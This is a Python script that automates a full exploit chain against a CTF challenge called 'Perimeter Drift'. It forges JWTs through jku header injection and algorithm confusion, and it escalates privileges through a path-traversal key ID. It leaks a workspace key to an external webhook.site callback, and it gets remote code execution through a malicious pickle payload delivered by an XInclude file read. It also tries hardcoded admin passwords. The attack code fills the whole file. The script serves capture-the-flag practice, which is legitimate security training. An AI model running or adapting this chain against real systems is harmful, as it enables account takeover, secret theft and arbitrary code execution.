#!/usr/bin/env python3
"""
Perimeter Drift CTF - Full Automated Exploit
Chain: SSO JWT forgery -> Reviewer escalation -> Bot workspace_key leak -> Pickle RCE

Vulnerabilities:
1. SSO JWT verification uses HMAC despite claiming RS256, jku header allows key injection
2. Reviewer grant verification has path traversal in kid parameter
3. Admin page bounce mechanism leaks workspace_key to arbitrary callback URL
4. Internal service has pickle.loads() deserialization -> RCE
"""
import base64
import hashlib
import hmac
import json
import os
import pickle
import re
import sys
import time
import urllib.parse

import requests

TARGET = "http://chall.0xfun.org:33382"
# Bot's TARGET_BASE - the bot sets cookies for this domain
# Try common values:
BOT_TARGET_BASES = [
    "http://host.docker.internal:5000",
    "http://host.docker.internal:31573",
    "http://web:5000",
]

HMAC_KEY = "mysecretkey"


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def forge_jwt(key: str, payload: dict, header_extra: dict = None) -> str:
    """Forge a JWT signed with HMAC-SHA256 (exploiting alg confusion)"""
    header = {"alg": "RS256", "typ": "JWT"}
    if header_extra:
        header.update(header_extra)
    h = b64url_encode(json.dumps(header, separators=(',', ':')).encode())
    p = b64url_encode(json.dumps(payload, separators=(',', ':')).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(key.encode(), signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"


def make_jku_url():
    """Create a JWKS URL using httpbin.org/base64 to host our key material"""
    jwks = json.dumps({"keys": [{"kid": "partner-main", "k": HMAC_KEY}]})
    b64 = base64.b64encode(jwks.encode()).decode()
    url = f"https://httpbin.org/base64/{urllib.parse.quote(b64, safe='')}"
    return url


def make_pickle_payload():
    """Pickle RCE: copy /flag.txt to /shared/loot/flag.txt"""
    class Exploit:
        def __reduce__(self):
            return (os.system, ('cp /flag.txt /shared/loot/flag.txt',))
    return pickle.dumps(Exploit())


def create_webhook():
    """Create a webhook.site endpoint for receiving callbacks"""
    r = requests.post("https://webhook.site/token", timeout=10)
    if r.status_code in (200, 201):
        data = r.json()
        uuid = data["uuid"]
        return uuid, f"https://webhook.site/{uuid}"
    return None, None


def poll_webhook(uuid, timeout=25):
    """Poll webhook.site for incoming requests to extract workspace_key"""
    print(f"    Polling webhook.site for {timeout}s...")
    start = time.time()
    while time.time() - start < timeout:
        try:
            r = requests.get(
                f"https://webhook.site/token/{uuid}/requests",
                timeout=10
            )
            if r.status_code == 200:
                data = r.json()
                reqs = data.get("data", [])
                for req_entry in reqs:
                    query = req_entry.get("query", {})
                    wk = query.get("workspace_key")
                    if wk:
                        return wk
                    # Also check URL
                    url = req_entry.get("url", "")
                    match = re.search(r'workspace_key=([^&]+)', url)
                    if match:
                        return urllib.parse.unquote(match.group(1))
        except Exception:
            pass
        time.sleep(2)
    return None


def step1_sso_login(s):
    """Step 1: SSO JWT forgery via jku header injection"""
    print("\n[Step 1] SSO JWT Forgery (jku header injection)")
    print("  Bug: verify_sso_id_token uses HMAC despite requiring alg=RS256")
    print("  The jku header lets us supply our own JWKS with controlled key material")

    jku_url = make_jku_url()
    print(f"  JWKS URL: {jku_url[:80]}...")

    now = int(time.time())
    token = forge_jwt(
        HMAC_KEY,
        {
            "sub": "researcher",
            "email": "nora.vale@drift.com",
            "name": "Nora Vale",
            "iss": "https://sso.partner.local",
            "aud": "perimeter-drift-web",
            "exp": now + 3600,
            "iat": now,
        },
        {"kid": "partner-main", "jku": jku_url}
    )

    print(f"  Forged JWT: {token[:60]}...")
    resp = s.get(f"{TARGET}/sso/callback", params={"id_token": token}, allow_redirects=True)
    print(f"  SSO callback: {resp.status_code} -> {resp.url}")

    check = s.get(f"{TARGET}/api/me")
    if check.status_code == 200:
        try:
            info = check.json()
            print(f"  [+] Logged in as: {info['username']} (role: {info['role']})")
            return info
        except Exception:
            pass

    print("  [-] SSO login failed")
    print(f"  Response: {resp.text[:300]}")
    return None


def step2_reviewer_escalation(s):
    """Step 2: Escalate to reviewer via path traversal in reviewer grant kid"""
    print("\n[Step 2] Reviewer Escalation (path traversal in kid parameter)")
    print("  Bug: kid is used to construct file path without sanitization")
    print("  KEYS_DIR / f\"{kid}.pem\" -> path traversal to uploaded file")

    # Upload a file with known content
    known_key = b"AAAA"
    files = {"file": ("exploit.pem", known_key, "application/octet-stream")}
    resp = s.post(f"{TARGET}/review/material/upload", files=files)
    print(f"  Upload key file: {resp.status_code} {resp.text}")

    if resp.status_code != 200:
        return False

    result = resp.json()
    filename = result.get("filename", "exploit.pem")
    kid_name = filename.rsplit(".pem", 1)[0] if filename.endswith(".pem") else filename
    kid = f"../review-materials/{kid_name}"
    print(f"  Path traversal kid: {kid}")

    # Forge reviewer grant JWT
    grant = forge_jwt(
        key=known_key.decode(),
        payload={"scope": "report:submit", "iat": int(time.time())},
        header_extra={"kid": kid}
    )

    resp = s.post(f"{TARGET}/review/escalate", data={"grant": grant}, allow_redirects=True)
    print(f"  Escalation: {resp.status_code}")

    check = s.get(f"{TARGET}/api/me")
    if check.status_code == 200:
        info = check.json()
        print(f"  [+] Current role: {info['role']}")
        return info["role"] in ("reviewer", "admin")
    return False


def step3_leak_workspace_key(s, callback_url):
    """Step 3: Use bot to leak workspace_key via admin bounce mechanism"""
    print("\n[Step 3] Bot Exploitation (admin bounce -> workspace_key leak)")
    print("  Bug: Admin page bounce mechanism redirects to arbitrary callback with workspace_key")

    submitted = False
    for target_base in BOT_TARGET_BASES:
        bot_url = f"{target_base}/admin?bounce=1&cb={urllib.parse.quote(callback_url, safe='')}"
        print(f"  Trying TARGET_BASE: {target_base}")

        resp = s.post(f"{TARGET}/report", data={"url": bot_url}, allow_redirects=True)
        # Check for success indicators in the response (flash messages in HTML)
        text = resp.text.lower()
        if "queued" in text or "validation request" in text or resp.status_code == 200:
            print(f"  [+] Bot request submitted (status {resp.status_code})")
            submitted = True
        else:
            print(f"  [-] Submission failed: {resp.status_code}")

    return submitted


def step4_pickle_rce(s, workspace_key):
    """Step 4: Upload pickle payload and trigger XML import for RCE on internal service"""
    print("\n[Step 4] Pickle Deserialization RCE")
    print("  Bug: Internal service calls pickle.loads() on imported data")

    pickle_payload = make_pickle_payload()
    b64_payload = base64.b64encode(pickle_payload).decode()
    print(f"  Pickle b64: {b64_payload[:50]}...")

    # Upload
    files = {"file": ("payload.b64", b64_payload, "text/plain")}
    resp = requests.post(
        f"{TARGET}/admin/upload",
        files=files,
        headers={"X-Workspace-Key": workspace_key}
    )
    print(f"  Upload: {resp.status_code} {resp.text}")

    # XML import with XInclude
    xml_payload = (
        '<doc sink="http://internal:9000/internal/import" '
        'xmlns:drift="http://www.w3.org/2001/XInclude">'
        '<drift:include href="file:///var/app/uploads/payload.b64" parse="text"/>'
        '</doc>'
    )
    resp = requests.post(
        f"{TARGET}/admin/xml/import",
        data={"xml": xml_payload},
        headers={"X-Workspace-Key": workspace_key}
    )
    print(f"  XML import: {resp.status_code} {resp.text}")


def step5_read_flag():
    """Step 5: Read the flag"""
    print("\n[Step 5] Reading Flag")
    resp = requests.get(f"{TARGET}/recovery/latest")
    return resp.text


def try_direct_admin():
    """Quick check: try direct admin login with docker-compose passwords"""
    s = requests.Session()
    for user, pw in [
        ("olivia.m", "Olivia.Admin-2026!"),
        ("isaac.r", "Isaac.Reviewer-2026!"),
    ]:
        s.post(f"{TARGET}/login", data={"username": user, "password": pw})
        check = s.get(f"{TARGET}/api/me")
        if check.status_code == 200:
            try:
                info = check.json()
                if info.get("role") == "admin":
                    print(f"[+] Direct admin login worked: {user}")
                    return s, info
            except Exception:
                pass
    return None, None


def solve():
    print("=" * 60)
    print("Perimeter Drift CTF - Automated Exploit")
    print("=" * 60)

    # Check if flag exists
    flag = step5_read_flag()
    if "0xfun{" in flag:
        print(f"\n{'='*60}")
        print(f"FLAG: {flag}")
        print(f"{'='*60}")
        return

    # Try direct admin login first
    print("\n[*] Quick check: trying direct admin login...")
    s, info = try_direct_admin()

    if s and info and info.get("role") == "admin":
        workspace_key = None
        resp = s.get(f"{TARGET}/admin")
        match = re.search(r'data-workspace-key="([^"]+)"', resp.text)
        if match:
            workspace_key = match.group(1)
            print(f"[+] Workspace key: {workspace_key}")
            step4_pickle_rce(s, workspace_key)
            time.sleep(3)
            flag = step5_read_flag()
            print(f"\n{'='*60}")
            print(f"FLAG: {flag}")
            print(f"{'='*60}")
            return

    # Full exploit chain
    s = requests.Session()

    # Step 1: SSO JWT forgery
    user_info = step1_sso_login(s)
    if not user_info:
        print("\n[-] FAILED: Could not authenticate via SSO")
        sys.exit(1)

    # Step 2: Reviewer escalation
    if user_info.get("role") == "researcher":
        if not step2_reviewer_escalation(s):
            print("\n[-] FAILED: Could not escalate to reviewer")
            sys.exit(1)

    # Step 3: Create webhook and submit bot URL
    print("\n[*] Creating webhook.site endpoint for callback...")
    webhook_uuid, webhook_url = create_webhook()
    if not webhook_uuid:
        print("[-] Failed to create webhook.site endpoint")
        sys.exit(1)
    print(f"  Callback URL: {webhook_url}")

    if not step3_leak_workspace_key(s, webhook_url):
        print("\n[-] FAILED: Could not submit URL to bot")
        sys.exit(1)

    # Poll for workspace_key
    print("\n[*] Waiting for bot to visit admin page and leak workspace_key...")
    workspace_key = poll_webhook(webhook_uuid, timeout=30)
    if not workspace_key:
        print("[-] FAILED: Did not receive workspace_key from bot")
        print("[*] The bot's TARGET_BASE might be different. Try adjusting BOT_TARGET_BASES.")
        sys.exit(1)

    print(f"[+] Got workspace_key: {workspace_key}")

    # Step 4: Pickle RCE
    step4_pickle_rce(s, workspace_key)

    # Step 5: Read flag
    time.sleep(3)
    flag = step5_read_flag()
    print(f"\n{'='*60}")
    print(f"FLAG: {flag}")
    print(f"{'='*60}")


if __name__ == "__main__":
    solve()
